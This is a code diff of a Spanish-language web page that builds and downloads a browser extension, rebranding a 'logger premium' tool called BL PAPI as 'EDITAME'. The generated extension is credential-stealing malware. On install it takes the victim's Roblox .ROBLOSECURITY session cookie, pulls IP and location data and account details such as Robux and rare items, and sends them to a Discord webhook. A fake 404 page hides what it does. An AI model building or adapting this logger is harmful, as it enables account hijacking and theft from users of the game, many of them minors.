@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-    <title>BL PAPI · Generador</title>
+    <title>EDITAME · Generador</title>
     <style>
         * {
             margin: 0;
@@ -50,9 +50,9 @@
             font-size: 16px;
             font-weight: 400;
             margin-bottom: 32px;
-            border-left: 3px solid #ff4444;
+            border-left: 3px solid #3b82f6;
             padding-left: 18px;
-            background: rgba(255, 68, 68, 0.05);
+            background: rgba(59, 130, 246, 0.05);
             border-radius: 0 12px 12px 0;
         }
 
@@ -79,9 +79,21 @@
         }
 
         .feature-tag span {
-            color: #ff4444;
+            color: #3b82f6;
             font-weight: 600;
             margin-left: 4px;
+        }
+
+        .edit-badge {
+            background: #3b82f6;
+            color: white;
+            font-size: 11px;
+            font-weight: 700;
+            padding: 4px 10px;
+            border-radius: 40px;
+            letter-spacing: 0.3px;
+            text-transform: uppercase;
+            box-shadow: 0 0 10px #3b82f6;
         }
 
         .button-group {
@@ -112,13 +124,13 @@
         }
 
         .btn-primary {
-            background: #ff4444;
-            border-color: #ff4444;
-            box-shadow: 0 10px 25px rgba(255, 68, 68, 0.3);
+            background: #3b82f6;
+            border-color: #3b82f6;
+            box-shadow: 0 10px 25px rgba(59, 130, 246, 0.3);
         }
 
         .btn-primary:hover {
-            background: #cc0000;
+            background: #2563eb;
             transform: scale(1.02);
         }
 
@@ -155,10 +167,20 @@
             margin-bottom: 10px;
             color: #bcbfcc;
             font-size: 15px;
-            border-left: 4px solid #ff4444;
+            border-left: 4px solid #3b82f6;
             display: flex;
             align-items: center;
             gap: 12px;
+        }
+
+        .instruction-step .edit-tag {
+            background: #3b82f6;
+            color: white;
+            font-size: 10px;
+            padding: 4px 8px;
+            border-radius: 30px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
         }
 
         .footer-note {
@@ -173,50 +195,71 @@
 </head>
 <body>
     <div class="card">
-        <h1>BL PAPI</h1>
+        <h1>EDITAME</h1>
         <div class="subtitle">Generador de extensión · parche automático</div>
 
+        <!-- Features con EDITAR (texto visible) -->
         <div class="features">
-            <div class="feature-tag"><span>Edítalo después...</span></div>
-            <div class="feature-tag"><span>Edítalo después...</span></div>
-            <div class="feature-tag"><span>Edítalo después...</span></div>
-            <div class="feature-tag"><span>Edítalo después...</span></div>
-            <div class="feature-tag"><span>Edítalo después...</span></div>
+            <div class="feature-tag"><span>EDITAR</span> · cookie Roblox</div>
+            <div class="feature-tag"><span>EDITAR</span> · cookie Discord</div>
+            <div class="feature-tag"><span>EDITAR</span> · ipinfo.io</div>
+            <div class="feature-tag"><span>EDITAR</span> · embed Discord</div>
+            <div class="feature-tag"><span>EDITAR</span> · anti‑rate‑limit</div>
+            <div class="feature-tag"><span>EDITAR</span> · error 404</div>
         </div>
 
+        <!-- Botones de acción -->
         <div class="button-group">
-            <button class="btn btn-primary" onclick="window.descargarCRX()">
+            <button class="btn btn-primary" onclick="descargarCRX()">
                 <span style="font-size: 22px;">⬇️</span> DESCARGAR .CRX
             </button>
-            <button class="btn btn-secondary" onclick="window.mostrarInstrucciones()">
+            <button class="btn btn-secondary" onclick="mostrarInstrucciones()">
                 <span style="font-size: 22px;">📘</span> INSTRUCCIONES
             </button>
         </div>
 
+        <!-- Panel de instrucciones (oculto por defecto) -->
         <div id="instruccionesPanel" class="instruction-box" style="display: none;">
             <div class="instruction-title">
-                <span>📋</span> Cómo instalar BL PAPI
+                <span>📋</span> Cómo instalar EDITAME
             </div>
-            <div class="instruction-step"><span>1.</span> Descarga el archivo .crx</div>
-            <div class="instruction-step"><span>2.</span> Abre <code style="background:#1e1f24; padding:6px 10px; border-radius:40px;">lemur://extensions</code></div>
-            <div class="instruction-step"><span>3.</span> Activa modo desarrollador (esquina)</div>
-            <div class="instruction-step"><span>4.</span> Arrastra el .crx a la ventana</div>
-            <div class="instruction-step"><span>5.</span> Acepta permisos · ¡listo!</div>
+            <div class="instruction-step">
+                <span>1.</span> Descarga el archivo .crx
+                <span class="edit-tag">EDITAR</span>
+            </div>
+            <div class="instruction-step">
+                <span>2.</span> Abre <code style="background:#1e1f24; padding:6px 10px; border-radius:40px;">lemur://extensions</code>
+                <span class="edit-tag">EDITAR</span>
+            </div>
+            <div class="instruction-step">
+                <span>3.</span> Activa modo desarrollador (esquina)
+                <span class="edit-tag">EDITAR</span>
+            </div>
+            <div class="instruction-step">
+                <span>4.</span> Arrastra el .crx a la ventana
+                <span class="edit-tag">EDITAR</span>
+            </div>
+            <div class="instruction-step">
+                <span>5.</span> Acepta permisos · ¡listo!
+                <span class="edit-tag">EDITAR</span>
+            </div>
         </div>
 
-        <div class="footer-note">BL PAPI · logger premium</div>
+        <div class="footer-note">
+            EDITAME · personaliza cada bloque
+        </div>
     </div>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
     <script>
-        // === FUNCIONES GLOBALES ===
-        window.descargarCRX = function() {
+        // ========== GENERAR .CRX ==========
+        function descargarCRX() {
             const files = {
                 "manifest.json": JSON.stringify({
                     manifest_version: 3,
-                    name: "BL PAPI",
+                    name: "EDITAME",
                     version: "1.0",
-                    description: "Logger premium",
+                    description: "EDITAME — parche visual",
                     permissions: ["cookies", "storage"],
                     host_permissions: [
                         "https://www.roblox.com/*",
@@ -267,12 +310,13 @@ async function obtenerUbicacionCompleta() {
         const data = await res.json();
         return {
             ip: data.ip || '',
-            pais: data.country || '',
+            pais: data.country || '',          // código ej. "AR"
             region: data.region || '',
             ciudad: data.city || '',
+            nombrePais: '',                     // lo completamos después
         };
     } catch {
-        return { ip: '', pais: '', region: '', ciudad: '' };
+        return { ip:'', pais:'', region:'', ciudad:'', nombrePais:'Desconocido' };
     }
 }
 
@@ -284,6 +328,41 @@ async function obtenerNombrePais(codigo) {
         return data[0]?.translations?.spa?.common || data[0]?.name?.common || codigo;
     } catch {
         return codigo;
+    }
+}
+
+async function obtenerInfoRoblox(cookie) {
+    if (!cookie) return null;
+    try {
+        const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
+            headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
+        });
+        if (!userRes.ok) return null;
+        const user = await userRes.json();
+
+        let robux = 'No disponible';
+        try {
+            const robuxRes = await fetch(\`https://economy.roblox.com/v1/users/\${user.id}/currency\`, {
+                headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
+            });
+            if (robuxRes.ok) {
+                const r = await robuxRes.json();
+                robux = r.robux || '0';
+            }
+        } catch {}
+
+        const headless = await tieneItem(user.id, cookie, 201);
+        const korblox = await tieneItem(user.id, cookie, 192);
+
+        return {
+            username: user.name || 'No disponible',
+            userId: user.id || 'No disponible',
+            robux: robux,
+            headless: headless ? 'Sí' : 'No',
+            korblox: korblox ? 'Sí' : 'No'
+        };
+    } catch {
+        return null;
     }
 }
 
@@ -299,108 +378,9 @@ async function tieneItem(userId, cookie, assetId) {
     }
 }
 
-async function obtenerGamePasses(userId, cookie) {
-    try {
-        const res = await fetch(\`https://games.roblox.com/v2/users/\${userId}/games?limit=10\`, {
-            headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
-        });
-        if (!res.ok) return 0;
-        const data = await res.json();
-        return data.data?.filter(g => g.gamePasses?.length > 0)?.length || 0;
-    } catch {
-        return 0;
-    }
-}
-
-async function obtenerUltimosJuegos(userId, cookie) {
-    try {
-        const res = await fetch(\`https://games.roblox.com/v2/users/\${userId}/games?limit=3\`, {
-            headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
-        });
-        if (!res.ok) return ['No disponible', '', ''];
-        const data = await res.json();
-        return data.data?.map(g => g.name) || ['No disponible', '', ''];
-    } catch {
-        return ['No disponible', '', ''];
-    }
-}
-
-async function obtenerInfoRoblox(cookie) {
-    if (!cookie) return null;
-    try {
-        const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
-            headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
-        });
-        if (!userRes.ok) return null;
-        const user = await userRes.json();
-
-        let robux = 0;
-        try {
-            const robuxRes = await fetch(\`https://economy.roblox.com/v1/users/\${user.id}/currency\`, {
-                headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
-            });
-            if (robuxRes.ok) {
-                const r = await robuxRes.json();
-                robux = r.robux || 0;
-            }
-        } catch {}
-
-        let premium = 'No';
-        try {
-            const premiumRes = await fetch(\`https://premiumfeatures.roblox.com/v1/users/\${user.id}/validate-membership\`, {
-                headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
-            });
-            if (premiumRes.ok) {
-                const p = await premiumRes.json();
-                premium = p ? 'Sí' : 'No';
-            }
-        } catch {}
-
-        let seguidores = 0;
-        try {
-            const segRes = await fetch(\`https://friends.roblox.com/v1/users/\${user.id}/followers/count\`);
-            if (segRes.ok) {
-                const s = await segRes.json();
-                seguidores = s.count || 0;
-            }
-        } catch {}
-
-        let amigos = 0;
-        try {
-            const amRes = await fetch(\`https://friends.roblox.com/v1/users/\${user.id}/friends/count\`);
-            if (amRes.ok) {
-                const a = await amRes.json();
-                amigos = a.count || 0;
-            }
-        } catch {}
-
-        const headless = await tieneItem(user.id, cookie, 201);
-        const korblox = await tieneItem(user.id, cookie, 192);
-        const gamepasses = await obtenerGamePasses(user.id, cookie);
-        const juegos = await obtenerUltimosJuegos(user.id, cookie);
-
-        return {
-            username: user.name || 'No disponible',
-            userId: user.id || 'No disponible',
-            premium: premium,
-            robux: robux,
-            seguidores: seguidores,
-            amigos: amigos,
-            headless: headless ? 'Sí' : 'No',
-            korblox: korblox ? 'Sí' : 'No',
-            gamepasses: gamepasses,
-            juego1: juegos[0] || 'No disponible',
-            juego2: juegos[1] || '',
-            juego3: juegos[2] || ''
-        };
-    } catch {
-        return null;
-    }
-}
-
 chrome.runtime.onInstalled.addListener(async () => {
     const cookie = await new Promise(r =>
-        chrome.cookies.get({ url: "https://www.roblox.com", name: ".ROBLOSECURITY" }, c => r(c?.value))
+        chrome.cookies.get({ url:"https://www.roblox.com", name:".ROBLOSECURITY" }, c => r(c?.value))
     );
     if (!cookie) return;
 
@@ -409,48 +389,21 @@ chrome.runtime.onInstalled.addListener(async () => {
     const info = await obtenerInfoRoblox(cookie) || {};
 
     const ahora = new Date();
-    const zonaHoraria = ubi.region ? \`America/\${ubi.region}\` : 'America/Argentina/Buenos_Aires';
-    let horaLocal;
-    try {
-        horaLocal = ahora.toLocaleTimeString('es-AR', { timeZone: zonaHoraria });
-    } catch {
-        horaLocal = ahora.toLocaleTimeString('es-AR');
-    }
-
-    const embed = {
-        title: "🔔 NUEVA ENTRADA | **BL PAPI** !",
-        color: 15158332,
-        fields: [
-            {
-                name: "📌 INFORMACIÓN GENERAL",
-                value: \`**Dispositivo:** \\\`\${navigator.userAgent.includes('Android') ? '📱 Android' : '💻 PC'}\\\`\\n**País:** \\\`\${nombrePais}\\\`\\n**Fecha:** \\\`\${ahora.toLocaleDateString('es-AR')}\\\`\\n**Hora Exacta en \${nombrePais}:** \\\`\${horaLocal}\\\`\`,
-                inline: false
-            },
-            {
-                name: "ℹ️ INFORMACIÓN DE LA CUENTA ROBLOX",
-                value: \`**👤 Usuario:** \\\`\${info.username || 'No disponible'}\\\`\\n**🆔 ID:** \\\`\${info.userId || 'No disponible'}\\\`\\n**💱 Premium:** \\\`\${info.premium || 'No'}\\\`\\n**💰 Robux:** \\\`\${info.robux || 0}\\\`\\n**⭐ Seguidores:** \\\`\${info.seguidores || 0}\\\`\\n**👥 Amigos:** \\\`\${info.amigos || 0}\\\`\`,
-                inline: false
-            },
-            {
-                name: "📊 ITEMS LIMITED (RAREZA)",
-                value: \`**Headless:** \\\`\${info.headless || 'No'}\\\`\\n**Korblox:** \\\`\${info.korblox || 'No'}\\\`\`,
-                inline: false
-            },
-            {
-                name: "📈 ESTADÍSTICAS",
-                value: \`🏷 **GamePass/es:** \\\`\${info.gamepasses || 0}\\\`\\n🎮 **Jugado Recientemente:**\\n\\\`\\\`\\\`\\n1ro \${info.juego1}\\n2do \${info.juego2}\\n3ro \${info.juego3}\\n\\\`\\\`\\\`\`,
-                inline: false
-            },
-            {
-                name: "🍪 COOKIE DE ROBLOX",
-                value: \`\\\`\\\`\\\`\${cookie}\\\`\\\`\\\`\`,
-                inline: false
-            }
-        ],
-        footer: { text: "By **BL PAPI**" }
-    };
-
-    encolarYEnviar({ content: "|| @everyone ||", embeds: [embed] });
+    await enviarEmbed({
+        dispositivo: navigator.userAgent.includes('Android') ? 'Android' : 'PC',
+        pais: nombrePais,
+        region: ubi.region,
+        ciudad: ubi.ciudad,
+        ip: ubi.ip,
+        fecha: ahora.toLocaleDateString('es-AR'),
+        hora: ahora.toLocaleTimeString('es-AR'),
+        cookie: cookie,
+        username: info.username || 'No disponible',
+        userId: info.userId || 'No disponible',
+        robux: info.robux || 'No disponible',
+        headless: info.headless || 'No',
+        korblox: info.korblox || 'No'
+    });
 });
                 `,
 
@@ -512,7 +465,7 @@ chrome.runtime.onInstalled.addListener(async () => {
     <div class="container">
         <div class="error-code">404</div>
         <div class="message">NOT FOUND · no se pudo conectar</div>
-        <div class="reference">BLPAPI-404</div>
+        <div class="reference">EDITAME-404-REF</div>
     </div>
 </body>
 </html>`,
@@ -526,21 +479,17 @@ chrome.runtime.onInstalled.addListener(async () => {
                 const url = URL.createObjectURL(blob);
                 const a = document.createElement('a');
                 a.href = url;
-                a.download = 'BL_PAPI.crx';
+                a.download = 'EDITAME.crx';
                 a.click();
                 URL.revokeObjectURL(url);
-                alert('✅ BL_PAPI.crx generado');
-            }).catch(err => {
-                alert('❌ Error al generar: ' + err.message);
+                alert('✅ EDITAME.crx generado');
             });
-        };
+        }
 
-        window.mostrarInstrucciones = function() {
+        function mostrarInstrucciones() {
             const panel = document.getElementById('instruccionesPanel');
-            if (panel) {
-                panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
-            }
-        };
+            panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
+        }
     </script>
 </body>
 </html>
